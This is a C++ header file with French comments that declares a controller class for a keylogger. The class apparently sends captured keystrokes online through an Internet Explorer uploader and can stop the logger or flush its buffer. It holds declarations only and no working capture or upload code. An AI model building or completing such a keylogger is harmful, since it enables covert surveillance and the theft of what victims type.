/*!
* \file CtrlUploadeurIE.h
* Fichier entête de la classe CtrlUploadeurIE, dérivée de Controleur
* \date 09/11/2008
* \author Xavier Monin
*/

#ifndef _CONTROLERENVOIKEYLOGGERVIAIE_H_
#define _CONTROLERENVOIKEYLOGGERVIAIE_H_

#include "Controleur.h"
#include "UploadeurIE.h"

/*!
* \class CtrlUploadeurIE
* \brief Controle les touches d'un KeyLogger.
* Controle les touches émises depuis un objet KeyLogger et les met en ligne par un objet UploadeurIE.
* Cette classe permet aussi de vider le buffer de l'objet UploadeurIE et de stopper le KeyLogger.
* \author Xavier Monin
*/
class CtrlUploadeurIE : public Controleur
{
public:
	CtrlUploadeurIE();
	~CtrlUploadeurIE();

	virtual bool effectuerAction(IdentifiantAction);
private:
	//void recupererInformationsUtilisateur();

	std::string LPWSTRVersString(const LPWSTR, UINT codepage=CP_ACP);

	//! Action pour l'arrêt du KeyLogger.
	IdentifiantAction arreter_keylogger;
	//! Action pour le vidage du buffer de UploadeurIE.
	IdentifiantAction vider_buffer;
};

#endif